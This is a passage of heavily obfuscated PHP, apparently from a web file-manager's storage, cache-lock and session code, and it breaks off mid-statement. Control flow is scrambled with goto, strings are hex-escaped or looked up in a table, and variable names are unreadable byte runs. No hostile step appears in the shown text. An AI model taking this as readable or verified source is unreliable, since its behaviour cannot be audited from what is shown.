$BñË⁄ìó«ï = array($E§‡ÑÊçŒ[1767] => $fÖŒèé„õô); if ($C€·∑•’ãÚ) { $BñË⁄ìó«ï = array($E§‡ÑÊçŒ[1768] => $C€·∑•’ãÚ); } return $this->order($E§‡ÑÊçŒ[1771])->where($BñË⁄ìó«ï)->find(); } public function clearEmpty($F¶Îàçú´´ = 0) { goto E÷´ƒÎﬁû≈; E÷´ƒÎﬁû≈: $EÉËÖ±ÁÇí =& $_SERVER[™⁄»üÆ]; $e∞ìíÇû∫∑ = time() - 3600 * 24 * $F¶Îàçú´´; $bπı√ë∂ŒÂ = $EÉËÖ±ÁÇí[1772] . $e∞ìíÇû∫∑; goto díóè¶Öæ°; díóè¶Öæ°: $Cá¡§á¯ãÆ = $this->where($bπı√ë∂ŒÂ)->select(); if (!$Cá¡§á¯ãÆ) { return; } $BÆ–õı°≥¡ = new Task($EÉËÖ±ÁÇí[1773], $EÉËÖ±ÁÇí[33], count($Cá¡§á¯ãÆ)); goto bíåÒ„⁄á∑; bíåÒ„⁄á∑: foreach ($Cá¡§á¯ãÆ as $cÓûÉ™èÆ) { $BÆ–õı°≥¡->update(1); $this->resetFile($cÓûÉ™èÆ); } $BÆ–õı°≥¡->end(); goto aœ»¶ØÜåº; aœ»¶ØÜåº: } public function resetFile($fåè√ÜÜ⁄) { goto fïÏ∂ﬁ∞‰ñ; a·÷„“πì˘: if ($fåè√ÜÜ⁄[$BÿûˆëªŸé[1770]] != $Aó‚π£ôÎœ) { $this->where($E¡øÉ©Áÿ’)->save(array($BÿûˆëªŸé[1766] => $Aó‚π£ôÎœ)); } goto bäÿÇãÂÁë; fïÏ∂ﬁ∞‰ñ: $BÿûˆëªŸé =& $_SERVER[™⁄»üÆ]; $E¡øÉ©Áÿ’ = array($BÿûˆëªŸé[449] => $fåè√ÜÜ⁄[$BÿûˆëªŸé[448]]); $Eˆ“‡ÃçÙ∞ = Model($BÿûˆëªŸé[1214])->where($E¡øÉ©Áÿ’)->count(); goto cµóÁÍÌ≈§; cµóÁÍÌ≈§: $fåÈ÷“≠ä— = Model($BÿûˆëªŸé[1774])->where($E¡øÉ©Áÿ’)->count(); $Aó‚π£ôÎœ = intval($Eˆ“‡ÃçÙ∞) + intval($fåÈ÷“≠ä—); if ($Aó‚π£ôÎœ == 0) { IO::remove($fåè√ÜÜ⁄[$BÿûˆëªŸé[76]]); Model($BÿûˆëªŸé[1775])->delete($fåè√ÜÜ⁄[$BÿûˆëªŸé[448]]); $this->where($E¡øÉ©Áÿ’)->delete(); $this->metaSet($fåè√ÜÜ⁄[$BÿûˆëªŸé[448]], null, null); return; } goto a·÷„“πì˘; bäÿÇãÂÁë: } public function storageInfo($F˜¨ª…Ω§¿ = false) { goto c¶è∞’ç±Ï; cÔ€Çò•‹¿: $d∫ò◊ë”ºè = 1; $d∑›•ËÚà  = 0; $eßÉ∏•ƒ°√ = 5000; goto d€è‹Çõøƒ; c¶è∞’ç±Ï: $e≥å∫êçÈ„ =& $_SERVER[™⁄»üÆ]; $bú“¥ıŒê„ = $this->count() + 0.0; $d·Úêÿ≤„À = 0; goto cÔ€Çò•‹¿; d€è‹Çõøƒ: for ($f∞æ™Üääü = 0; $f∞æ™Üääü < $bú“¥ıŒê„; $f∞æ™Üääü = $f∞æ™Üääü + $eßÉ∏•ƒ°√) { $e÷äÛú±ÈÃ = $this->limit($f∞æ™Üääü, $f∞æ™Üääü + $eßÉ∏•ƒ°√)->select(); foreach ($e÷äÛú±ÈÃ as $cÂà¡∞ë∫€) { $d∫ò◊ë”ºè += $cÂà¡∞ë∫€[$e≥å∫êçÈ„[78]] * $cÂà¡∞ë∫€[$e≥å∫êçÈ„[1770]]; $d·Úêÿ≤„À += $cÂà¡∞ë∫€[$e≥å∫êçÈ„[78]] * ($cÂà¡∞ë∫€[$e≥å∫êçÈ„[1770]] - 1); $d∑›•ËÚà  += $cÂà¡∞ë∫€[$e≥å∫êçÈ„[1770]]; } } $f≈ƒáåÜê° = array($e≥å∫êçÈ„[1776] => $d∫ò◊ë”ºè, $e≥å∫êçÈ„[1777] => $d·Úêÿ≤„À, $e≥å∫êçÈ„[1778] => $d·Úêÿ≤„À / $d∫ò◊ë”ºè, $e≥å∫êçÈ„[82] => $bú“¥ıŒê„, $e≥å∫êçÈ„[1779] => $d∑›•ËÚà ); return $f≈ƒáåÜê°; goto d•∑‡÷Ë¶Í; d•∑‡÷Ë¶Í: } } goto FèÙ£≥êÓ≤; BÆì†åÇ¢Û: class CacheLockRedis { public function lock($Aﬂ◊ü⁄†ú´, $F≥äˆ‹Æ•á = 10) { $eÙûƒººùì = Cache::init(); $C≠à‘à⁄å  = microtime(!0) + $F≥äˆ‹Æ•á; while (microtime(!0) < $C≠à‘à⁄å ) { $f‡πÍÖ„Ü† = $eÙûƒººùì->get($Aﬂ◊ü⁄†ú´); if (!$f‡πÍÖ„Ü†) { $B˜ÔÔ™µ˘Æ = $eÙûƒººùì->setLock($Aﬂ◊ü⁄†ú´, $C≠à‘à⁄å , $F≥äˆ‹Æ•á); if ($B˜ÔÔ™µ˘Æ) { return !0; } } else { if ($f‡πÍÖ„Ü† < microtime(!0)) { $eÙûƒººùì->set($Aﬂ◊ü⁄†ú´, $C≠à‘à⁄å , $F≥äˆ‹Æ•á * 2); if ($eÙûƒººùì->get($Aﬂ◊ü⁄†ú´) === $f‡πÍÖ„Ü†) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($CÏè≤äŸÖô) { return Cache::init()->get($CÏè≤äŸÖô); } public function unlock($Bò¯Ï‰íÖë) { return Cache::init()->remove($Bò¯Ï‰íÖë); } } class CacheLockMemcached { public function lock($BÈŸ›ı∏∆ø, $f˘€–ä¥òç = 0) { $Bº±ó’¶•€ = Cache::init(); $cõ≥ÊòÌÁñ = microtime(!0) + $f˘€–ä¥òç; while (microtime(!0) < $cõ≥ÊòÌÁñ) { $F∫∂Íäıáû = $Bº±ó’¶•€->get($BÈŸ›ı∏∆ø); if (!$F∫∂Íäıáû || $F∫∂Íäıáû < microtime(!0)) { $f¯¶å◊≠≥ = $Bº±ó’¶•€->handle->add($BÈŸ›ı∏∆ø, $cõ≥ÊòÌÁñ, $f˘€–ä¥òç); if ($f¯¶å◊≠≥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eƒŒç°ã”É) { return Cache::init()->get($eƒŒç°ã”É); } public function unlock($f‰ì∑áÈ§) { return Cache::init()->remove($f‰ì∑áÈ§); } } class CacheLockDatabase { public function lock($CÍ™ÖúÎî, $CôíØß∏ŒÒ = 0) { $D˘î«£∂Ëã = Model($_SERVER[™⁄»üÆ][813]); $B∆ã«€€∑∫ = microtime(!0) + $CôíØß∏ŒÒ; while (microtime(!0) < $B∆ã«€€∑∫) { $f£˜áÎ›üÖ = $D˘î«£∂Ëã->get($CÍ™ÖúÎî); if (!$f£˜áÎ›üÖ || $f£˜áÎ›üÖ < microtime(!0)) { $F’ñﬂŸ∑Ö“ = $D˘î«£∂Ëã->set($CÍ™ÖúÎî, $B∆ã«€€∑∫); if ($F’ñﬂŸ∑Ö“) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bƒ¯®‹¡ ﬂ) { return Model($_SERVER[™⁄»üÆ][813])->get($bƒ¯®‹¡ ﬂ); } public function unlock($E⁄Ñ∞ãîØ‡) { Model($_SERVER[™⁄»üÆ][813])->remove($E⁄Ñ∞ãîØ‡); } } goto fõÑ´áÊôî; A√Áäß¡®Ò: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\163\x6f\165\x72\x63\145\x53\145\x63\x72\x65\x74\114\151\163\164"; public $field = array("\163\157\x75\x72\x63\x65\x49\x44", "\164\x79\x70\x65\x49\104", "\x63\162\x65\x61\164\x65\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x73\x74\x6f\x72\141\x67\145\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x73\151\172\x65\115\141\x78", "\163\x79\x73\x74\x65\x6d", "\x64\x65\146\141\x75\154\x74", "\144\x72\151\x76\x65\162", "\143\x6f\156\x66\x69\147"); public function listData($b•´çáÉ»© = false, $EŸ®™Ç¿Û√ = "\x6d\157\144\x69\146\171\124\x69\x6d\x65", $D‰ûØÕàôÒ = false) { $AèùâæÁÙÌ =& $_SERVER[™⁄»üÆ]; $Fùí√‘Ï–◊ = parent::listData($b•´çáÉ»©, $EŸ®™Ç¿Û√, $D‰ûØÕàôÒ); if ($b•´çáÉ»©) { return $Fùí√‘Ï–◊; } $c∂¶‰ª∂Ò£ = $this->ioSizeUseGet(array_to_keyvalue($Fùí√‘Ï–◊, $AèùâæÁÙÌ[33], $AèùâæÁÙÌ[394])); foreach ($Fùí√‘Ï–◊ as $a¿ÊºÇÑÑâ => $fˆ™§Õ≤Ôº) { unset($Fùí√‘Ï–◊[$a¿ÊºÇÑÑâ][$AèùâæÁÙÌ[6]]); $Fùí√‘Ï–◊[$a¿ÊºÇÑÑâ][$AèùâæÁÙÌ[1692]] = isset($c∂¶‰ª∂Ò£[$fˆ™§Õ≤Ôº[$AèùâæÁÙÌ[394]]]) ? $c∂¶‰ª∂Ò£[$fˆ™§Õ≤Ôº[$AèùâæÁÙÌ[394]]] : 0; } return $Fùí√‘Ï–◊; } public function ioSizeUseGet($Bï¶≠§ÉñÉ) { goto D”ı´†â≤¢; D”ı´†â≤¢: $B≈„Ö‹ÃÆÎ =& $_SERVER[™⁄»üÆ]; if (!$Bï¶≠§ÉñÉ) { return array(); } $FÜåÁ¥ÊÒÏ = $B≈„Ö‹ÃÆÎ[2009] . implode($B≈„Ö‹ÃÆÎ[47], $Bï¶≠§ÉñÉ); goto bØäÃÍÕ ä; EÃá‰‰´‹é: Cache::set($FÜåÁ¥ÊÒÏ, $eÖÇùí›≈’, 600); return $eÖÇùí›≈’; goto A∂ÁÀêâ¿ñ; bØäÃÍÕ ä: $eÖÇùí›≈’ = Cache::get($FÜåÁ¥ÊÒÏ); if ($eÖÇùí›≈’) { return $eÖÇùí›≈’; } $A®çæ–ÔßÒ = array($B≈„Ö‹ÃÆÎ[801] => $B≈„Ö‹ÃÆÎ[394], $B≈„Ö‹ÃÆÎ[2010] => $B≈„Ö‹ÃÆÎ[78]); goto b¨Ú∏ËÍî€; b¨Ú∏ËÍî€: $DÇéõòªÖ¢ = array($B≈„Ö‹ÃÆÎ[801] => array($B≈„Ö‹ÃÆÎ[7], $Bï¶≠§ÉñÉ)); $eÖÇùí›≈’ = Model($B≈„Ö‹ÃÆÎ[766])->field($A®çæ–ÔßÒ)->where($DÇéõòªÖ¢)->group($B≈„Ö‹ÃÆÎ[801])->select(); $eÖÇùí›≈’ = array_to_keyvalue($eÖÇùí›≈’, $B≈„Ö‹ÃÆÎ[394], $B≈„Ö‹ÃÆÎ[78]); goto EÃá‰‰´‹é; A∂ÁÀêâ¿ñ: } public function getConfig($eéüˆßÎÀ¥) { $B˜Ÿ∑¢…º‘ = parent::listData($eéüˆßÎÀ¥); return json_decode($B˜Ÿ∑¢…º‘[$_SERVER[™⁄»üÆ][6]], !0); } public function update($Cƒõû∑òÔ¬, $eﬂò¬‘áä±) { goto cπåò†ﬁè‡; Dá˜÷ˆòñΩ: $B∆Ëàñ¿®∑ = parent::update($Cƒõû∑òÔ¬, $eﬂò¬‘áä±); if ($B∆Ëàñ¿®∑ && $eﬂò¬‘áä±[$Bú’ÇÈŸÀâ[34]]) { foreach ($D≈ââ“‘ö∆ as $cÊ§‘Õ∆ÎÑ) { if ($cÊ§‘Õ∆ÎÑ[$Bú’ÇÈŸÀâ[34]] && $cÊ§‘Õ∆ÎÑ[$Bú’ÇÈŸÀâ[394]] != $Cƒõû∑òÔ¬) { parent::update($cÊ§‘Õ∆ÎÑ[$Bú’ÇÈŸÀâ[394]], array($Bú’ÇÈŸÀâ[34] => 0)); } } } return $B∆Ëàñ¿®∑; goto CÉâÁ‡…·É; cπåò†ﬁè‡: $Bú’ÇÈŸÀâ =& $_SERVER[™⁄»üÆ]; $aëêª›ãèÇ = $eﬂò¬‘áä±[$Bú’ÇÈŸÀâ[28]]; $D≈ââ“‘ö∆ = array_to_keyvalue(parent::listData(), $Bú’ÇÈŸÀâ[28]); goto e•ÂÑŸø“à; e•ÂÑŸø“à: if (isset($D≈ââ“‘ö∆[$aëêª›ãèÇ]) && $D≈ââ“‘ö∆[$aëêª›ãèÇ][$Bú’ÇÈŸÀâ[394]] != $Cƒõû∑òÔ¬) { return !1; } if (isset($eﬂò¬‘áä±[$Bú’ÇÈŸÀâ[2011]]) && $eﬂò¬‘áä±[$Bú’ÇÈŸÀâ[2011]] == $Bú’ÇÈŸÀâ[87]) { $this->checkConfig($eﬂò¬‘áä±); } unset($eﬂò¬‘áä±[$Bú’ÇÈŸÀâ[2011]]); goto Dá˜÷ˆòñΩ; CÉâÁ‡…·É: } public function add($fÕÍπü”…Õ) { goto C∑æ‹÷Ÿÿ¿; d∑¢ù“ﬂ–ú: return $f∫óËÌá—Ô; goto D¥ääıÑΩó; C∑æ‹÷Ÿÿ¿: $EØ¢âÍΩû  =& $_SERVER[™⁄»üÆ]; $d“À¯™∫ÒÍ = array_to_keyvalue(parent::listData(), $EØ¢âÍΩû [28]); if (isset($d“À¯™∫ÒÍ[$fÕÍπü”…Õ[$EØ¢âÍΩû [28]]])) { return !1; } goto a∫Ü∫ÿ†Ë‘; a∫Ü∫ÿ†Ë‘: $this->checkConfig($fÕÍπü”…Õ); $f∫óËÌá—Ô = parent::insert($fÕÍπü”…Õ); if ($f∫óËÌá—Ô && $fÕÍπü”…Õ[$EØ¢âÍΩû [34]]) { foreach ($d“À¯™∫ÒÍ as $EÓÖ∫óãç) { if ($EÓÖ∫óãç[$EØ¢âÍΩû [34]]) { parent::update($EÓÖ∫óãç[$EØ¢âÍΩû [394]], array($EØ¢âÍΩû [34] => 0)); } } } goto d∑¢ù“ﬂ–ú; D¥ääıÑΩó: } public function checkConfig(&$c¡íä†«àã, $dâìôöÕ«¿ = false) { goto Eãå√πÌäÎ; EÓÎ∏à°ë≈: $c¡íä†«àã[$Fı”÷⁄ä∆ò[6]] = json_encode($AÕﬁÕ÷¯â¿); $c¡íä†«àã[$Fı”÷⁄ä∆ò[94]] = $Aˆÿ¨∂æúÂ; return !0; goto b º¶¯ÿ‹±; Dµµ√ì»àà: $Aˆÿ¨∂æúÂ = isset($eäπ‹≈ß£‰[$bÙçéÜ¡∂«]) ? $eäπ‹≈ß£‰[$bÙçéÜ¡∂«] : ucfirst($bÙçéÜ¡∂«); $EÌÂ√áÀ¯« = $Fı”÷⁄ä∆ò[72] . $Aˆÿ¨∂æúÂ; if (!$Aˆÿ¨∂æúÂ || !class_exists($EÌÂ√áÀ¯«)) { if ($dâìôöÕ«¿) { return LNG($Fı”÷⁄ä∆ò[2013]); } write_log(array($Fı”÷⁄ä∆ò[2014], $c¡íä†«àã, get_caller_info()), $Fı”÷⁄ä∆ò[2015]); show_json(LNG($Fı”÷⁄ä∆ò[2013]), !1, $c¡íä†«àã); } goto e∫∫§πûÔù; dê‹ÈõÀäÃ: $aí˘ÆûÕ‡ò = $bÜûÖÆÑ∫≥->getPath($c∑¡Ñ¥·õ∞ . $Fı”÷⁄ä∆ò[1146]); if (!$bÜûÖÆÑ∫≥->mkfile($aí˘ÆûÕ‡ò)) { if ($dâìôöÕ«¿) { return LNG($Fı”÷⁄ä∆ò[2016]); } show_json(LNG($Fı”÷⁄ä∆ò[2016]), !1); } $AÕﬁÕ÷¯â¿[$Fı”÷⁄ä∆ò[1084]] = $c∑¡Ñ¥·õ∞; goto EÓÎ∏à°ë≈; Eãå√πÌäÎ: $Fı”÷⁄ä∆ò =& $_SERVER[™⁄»üÆ]; $bÙçéÜ¡∂« = strtolower($c¡íä†«àã[$Fı”÷⁄ä∆ò[94]]); $AÕﬁÕ÷¯â¿ = json_decode($c¡íä†«àã[$Fı”÷⁄ä∆ò[6]], !0); goto cΩ£¶·ÇÖ‘; e∫∫§πûÔù: $bÜûÖÆÑ∫≥ = new $EÌÂ√áÀ¯«($AÕﬁÕ÷¯â¿); if (in_array($bÙçéÜ¡∂«, $bÜûÖÆÑ∫≥->objectDriver)) { if (!$bÜûÖÆÑ∫≥->isBucketCors() && !$bÜûÖÆÑ∫≥->setBucketCors()) { $aáú¨Æ´Ìù = LNG($Fı”÷⁄ä∆ò[2016]); $aáú¨Æ´Ìù .= $Fı”÷⁄ä∆ò[2017] . LNG($Fı”÷⁄ä∆ò[2018]); if ($dâìôöÕ«¿) { return $aáú¨Æ´Ìù; } show_json($aáú¨Æ´Ìù, !1); } } $c∑¡Ñ¥·õ∞ = rtrim($AÕﬁÕ÷¯â¿[$Fı”÷⁄ä∆ò[1084]], $Fı”÷⁄ä∆ò[8]) . $Fı”÷⁄ä∆ò[8]; goto dê‹ÈõÀäÃ; cΩ£¶·ÇÖ‘: foreach ($AÕﬁÕ÷¯â¿ as $cßáß≠ê∫⁄ => $EùõÆ–éÌµ) { $AÕﬁÕ÷¯â¿[$cßáß≠ê∫⁄] = trim($EùõÆ–éÌµ); } $AÕﬁÕ÷¯â¿[$Fı”÷⁄ä∆ò[2012]] = rand_string(6); $eäπ‹≈ß£‰ = $GLOBALS[$Fı”÷⁄ä∆ò[6]][$Fı”÷⁄ä∆ò[88]][$Fı”÷⁄ä∆ò[810]]; goto Dµµ√ì»àà; b º¶¯ÿ‹±: } public function driverListSystem() { $D¯‚íﬁµÔΩ =& $_SERVER[™⁄»üÆ]; $Dëœ∞·Ñ≈î = parent::listData(); $bﬂõÔãü’ô = array(); foreach ($Dëœ∞·Ñ≈î as $f›Ÿ∏ÖêÁµ) { unset($f›Ÿ∏ÖêÁµ[$D¯‚íﬁµÔΩ[194]], $f›Ÿ∏ÖêÁµ[$D¯‚íﬁµÔΩ[84]]); $f›Ÿ∏ÖêÁµ[$D¯‚íﬁµÔΩ[6]] = json_decode($f›Ÿ∏ÖêÁµ[$D¯‚íﬁµÔΩ[6]], !0); $bﬂõÔãü’ô[] = $f›Ÿ∏ÖêÁµ; } return $bﬂõÔãü’ô; } public function defaultDriver() { $EòØåπüÌÚ =& $_SERVER[™⁄»üÆ]; $fí—Ú‘àÕ = parent::listData(); $cÇÏ“ı÷Œ• = array_filter_by_field($fí—Ú‘àÕ, $EòØåπüÌÚ[34], 1); $cÇÏ“ı÷Œ• = $cÇÏ“ı÷Œ•[0]; if ($cÇÏ“ı÷Œ•) { $cÇÏ“ı÷Œ•[$EòØåπüÌÚ[6]] = json_decode($cÇÏ“ı÷Œ•[$EòØåπüÌÚ[6]], !0); } return $cÇÏ“ı÷Œ•; } public function driverInfo($c¬íâãã´”) { $EªÁ«ƒ©™È =& $_SERVER[™⁄»üÆ]; $b∆≈ºƒªéË = array_to_keyvalue(parent::listData(), $EªÁ«ƒ©™È[394]); if (!isset($b∆≈ºƒªéË[$c¬íâãã´”])) { return !1; } $Có∑ß±ÿØ∞ = $b∆≈ºƒªéË[$c¬íâãã´”]; $Có∑ß±ÿØ∞[$EªÁ«ƒ©™È[6]] = json_decode($Có∑ß±ÿØ∞[$EªÁ«ƒ©™È[6]], !0); return $Có∑ß±ÿØ∞; } public function remove($bÀ„†‹ºŸè) { $this->removeShareItems($bÀ„†‹ºŸè); return parent::remove($bÀ„†‹ºŸè); } public function removeWithFile($dπÑ∞√‘çÙ, $F‚ÿ»êøñ±) { goto c‚åÌç£„∂; e€Í¶ïÂ´⁄: $dΩÈ⁄•Ö≠± = Model($dÕ¬¡§çÑ–[451])->where($aâÂ°»Òë∑)->sum($dÕ¬¡§çÑ–[78]); $BÁ∑üÆÑ©ﬁ = $F‚ÿ»êøñ± . $dÕ¬¡§çÑ–[2019] . $dπÑ∞√‘çÙ; $BÕ√Çˆ‰À´ = new TaskFileTransfer($BÁ∑üÆÑ©ﬁ, $dÕ¬¡§çÑ–[2015], $bŒ ÀÕ‡ıê, LNG($dÕ¬¡§çÑ–[2020]) . "\x28{$dπÑ∞√‘çÙ}\51"); goto eÈßÕäÉ‚Ù; c–ºù≤¡≤∞: $c“œàè◊è™ = "\x7b\151\157\72{$A÷î¡Ñˆó›}\175\57"; $B‹ƒÙàÆ‡Ô = !0; $a”œ·∏ÇÊÔ = array(); goto DÏÃÇ§∫√Á; eÈßÕäÉ‚Ù: $BÕ√Çˆ‰À´->task[$dÕ¬¡§çÑ–[742]] = (double) $dΩÈ⁄•Ö≠±; $B¡Àå‰Œ…Ò = KodIO::defaultDriver(); $A÷î¡Ñˆó› = $B¡Àå‰Œ…Ò[$dÕ¬¡§çÑ–[394]]; goto c–ºù≤¡≤∞; C∏—“›ù∂»: if (!$B‹ƒÙàÆ‡Ô) { $BÕ√Çˆ‰À´->stop($BÁ∑üÆÑ©ﬁ); return !1; } $BÕ√Çˆ‰À´->end(); if ($F‚ÿ»êøñ± == $dÕ¬¡§çÑ–[1672]) { $this->remove($dπÑ∞√‘çÙ); } goto d®ô©ªıå≈; c‚åÌç£„∂: $dÕ¬¡§çÑ– =& $_SERVER[™⁄»üÆ]; $aâÂ°»Òë∑ = array($dÕ¬¡§çÑ–[801] => $dπÑ∞√‘çÙ); $bŒ ÀÕ‡ıê = Model($dÕ¬¡§çÑ–[451])->where($aâÂ°»Òë∑)->count(); goto e€Í¶ïÂ´⁄; DÏÃÇ§∫√Á: $BÏê† Ñ€Ö = Model($dÕ¬¡§çÑ–[193])->where($aâÂ°»Òë∑)->field($dÕ¬¡§çÑ–[2021])->select(); foreach ($BÏê† Ñ€Ö as $Fèµ≠û‡‰ï) { goto c˜¥Àê°ñÙ; EñÁ¨∞Ç˜ç: if (IO::exist($DË«ã®á…Ù)) { $BÕ√Çˆ‰À´->updateFileEnd($Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[28]], $Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[78]]); continue; } if (!IO::move($BÙ¯–‹…á’, get_path_father($DË«ã®á…Ù))) { $B‹ƒÙàÆ‡Ô = !1; break; } $aâÂ°»Òë∑ = array($dÕ¬¡§çÑ–[448] => $Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[448]]); goto BˆÑ‹ì®á™; c˜¥Àê°ñÙ: $BÙ¯–‹…á’ = $Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[76]]; $DË«ã®á…Ù = $c“œàè◊è™ . str_replace("\x7b\x69\x6f\72{$dπÑ∞√‘çÙ}\175\57", $dÕ¬¡§çÑ–[33], $BÙ¯–‹…á’); if (!IO::exist($BÙ¯–‹…á’)) { $a”œ·∏ÇÊÔ[] = $Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[448]]; $BÕ√Çˆ‰À´->updateFileEnd($Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[28]], $Fèµ≠û‡‰ï[$dÕ¬¡§çÑ–[78]]); continue; } goto EñÁ¨∞Ç˜ç; BˆÑ‹ì®á™: $EÇè•ëÁèÊ = array($dÕ¬¡§çÑ–[801] => $A÷î¡Ñˆó›, $dÕ¬¡§çÑ–[76] => $DË«ã®á…Ù); Model($dÕ¬¡§çÑ–[193])->where($aâÂ°»Òë∑)->save($EÇè•ëÁèÊ); goto DÇ±¢Òâ∞¯; DÇ±¢Òâ∞¯: } $this->removeByFileID($a”œ·∏ÇÊÔ); goto C∏—“›ù∂»; d®ô©ªıå≈: } public function progress($fµö±®ã∫Ñ, $b…Ç‘øÚø∞) { return Task::get($b…Ç‘øÚø∞ . $_SERVER[™⁄»üÆ][2019] . $fµö±®ã∫Ñ); } private function removeByFileID($e∑ﬁÒÜŒœı = array()) { goto f“©÷ÍŸΩÌ; Fì∑∑ÀπÇú: $Dì‡ü—Õ«ç = Model($aµÀÉõæƒß[1214])->where($f∏ã‰‚éüù)->field($aµÀÉõæƒß[396])->select(); if (!$Dì‡ü—Õ«ç) { return; } $Dì‡ü—Õ«ç = array_to_keyvalue($Dì‡ü—Õ«ç, $aµÀÉõæƒß[33], $aµÀÉõæƒß[396]); goto f€ëÔÃŸ¶ï; f€ëÔÃŸ¶ï: foreach ($Dì‡ü—Õ«ç as $EùèºãÁîÊ) { Model($aµÀÉõæƒß[410])->removeNow($EùèºãÁîÊ, !1); } goto C‘Ì ¥Ç™¨; f“©÷ÍŸΩÌ: $aµÀÉõæƒß =& $_SERVER[™⁄»üÆ]; if (empty($e∑ﬁÒÜŒœı)) { return; } $f∏ã‰‚éüù = array($aµÀÉõæƒß[448] => array($aµÀÉõæƒß[7], $e∑ﬁÒÜŒœı)); goto Fì∑∑ÀπÇú; C‘Ì ¥Ç™¨: } private function removeShareItems($D÷Ôú§–ü˘) { goto AÁæ∑‡∂¿‹; aå¢¢‡‡¡µ: Model($D»ä–‚•÷Ã[577])->remove($dë≤í∑†ê±); goto D–àä∑ÖÆΩ; a‘ãíÿÒ‹·: $aÛ´ÔóØµÒ = Model($D»ä–‚•÷Ã[1683])->where($b≤ì“∑Ü€∫)->field($D»ä–‚•÷Ã[469])->select(); if (empty($aÛ´ÔóØµÒ)) { return; } $dë≤í∑†ê± = array_to_keyvalue($aÛ´ÔóØµÒ, $D»ä–‚•÷Ã[33], $D»ä–‚•÷Ã[469]); goto aå¢¢‡‡¡µ; AÁæ∑‡∂¿‹: $D»ä–‚•÷Ã =& $_SERVER[™⁄»üÆ]; $cÀøøãÙˆ• = "\x7b\151\157\x3a{$D÷Ôú§–ü˘}\175\57"; $b≤ì“∑Ü€∫ = array($D»ä–‚•÷Ã[396] => 0, $D»ä–‚•÷Ã[1079] => array($D»ä–‚•÷Ã[380], "{$cÀøøãÙˆ•}\x25")); goto a‘ãíÿÒ‹·; D–àä∑ÖÆΩ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\114\x69\147\150\x74\x41\160\x70"; public $modelType = "\123\x79\x73\164\x65\155\x4f\x70\164\x69\x6f\x6e"; public $field = array("\156\x61\155\x65", "\x67\162\157\x75\160", "\x64\145\x73\x63", "\143\x6f\x6e\x74\145\156\164"); public function listData($B’◊∂÷ö≥¢ = false, $b–‰ïöÓÏ = "\x6d\157\144\x69\x66\171\124\151\155\145", $cÚåÍ‘Ö€Ï = true) { return parent::listData($B’◊∂÷ö≥¢, $b–‰ïöÓÏ, $cÚåÍ‘Ö€Ï); } public function remove($aÔ¥Æ◊É™–) { $f™ó«ÇÚ´¯ = $this->findByName($aÔ¥Æ◊É™–); if (!$f™ó«ÇÚ´¯) { return !1; } return parent::remove($f™ó«ÇÚ´¯[$_SERVER[™⁄»üÆ][394]]); } public function add($A≤ÍâµËæ·) { if ($this->findByName($A≤ÍâµËæ·[$_SERVER[™⁄»üÆ][28]])) { return !1; } return parent::insert($A≤ÍâµËæ·); } public function update($fèô°⁄◊áä, $bÿ•œÒü∆Ü) { $dÆ¯ôËâï =& $_SERVER[™⁄»üÆ]; $fßÜàŸï◊¨ = $this->findByName($fèô°⁄◊áä); $Fí˜Èó±Ñƒ = $this->findByName($bÿ•œÒü∆Ü[$dÆ¯ôËâï[28]]); if (!$fßÜàŸï◊¨ || $Fí˜Èó±Ñƒ && $Fí˜Èó±Ñƒ[$dÆ¯ôËâï[394]] != $fßÜàŸï◊¨[$dÆ¯ôËâï[394]]) { return !1; } return parent::update($fßÜàŸï◊¨[$dÆ¯ôËâï[394]], $bÿ•œÒü∆Ü); } } goto BòÆ÷Ñ·ÿÉ; Eáı≈ë¨≈í: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto D‰∞ƒÕïΩ∞; d¶Öàëîâæ: $e´≥ÁäïéÆ = $GLOBALS[$Cô‰ùô“ûå[6]][$Cô‰ùô“ûå[347]]; self::$sessionTime = $e´≥ÁäïéÆ[$Cô‰ùô“ûå[1496]]; $Fı•ú®∞¬∂ = isset($GLOBALS[$Cô‰ùô“ûå[1497]]) ? $GLOBALS[$Cô‰ùô“ûå[1497]] : SESSION_ID; goto CÉ„èáèﬁ∫; cŒ∆˘‡òΩΩ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $BŸ·©ø“ÈÕ = new self(); return $BŸ·©ø“ÈÕ; goto A∂¯É·ÑÎÓ; bãÑ· €Œâ: $AñÖ≠âç±« = $e´≥ÁäïéÆ[$bº∑·øè•¯]; $d Ë⁄∑™Œ = $e´≥ÁäïéÆ[$Cô‰ùô“ûå[812]]; switch ($bº∑·øè•¯) { case $Cô‰ùô“ûå[17]: self::$handle = Model($Cô‰ùô“ûå[813]); break; case $Cô‰ùô“ûå[814]: self::$handle = new CacheRedis($AñÖ≠âç±«, $d Ë⁄∑™Œ); break; case $Cô‰ùô“ûå[815]: self::$handle = new CacheMemcached($AñÖ≠âç±«, $d Ë⁄∑™Œ); break; case $Cô‰ùô“ûå[193]: $AñÖ≠âç±«[$Cô‰ùô“ûå[76]] = $AñÖ≠âç±«[$Cô‰ùô“ûå[76]] . $Cô‰ùô“ûå[1499]; self::$handle = new CacheFile($AñÖ≠âç±«, $d Ë⁄∑™Œ); default: break; } goto cŒ∆˘‡òΩΩ; CÉ„èáèﬁ∫: if (self::$sessionSign) { } else { if (Cookie::get($Fı•ú®∞¬∂)) { self::$sessionSign = Cookie::get($Fı•ú®∞¬∂); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Fı•ú®∞¬∂, self::$sessionSign, self::$sessionTime); $bº∑·øè•¯ = $e´≥ÁäïéÆ[$Cô‰ùô“ûå[1498]]; goto bãÑ· €Œâ; D‰∞ƒÕïΩ∞: $Cô‰ùô“ûå =& 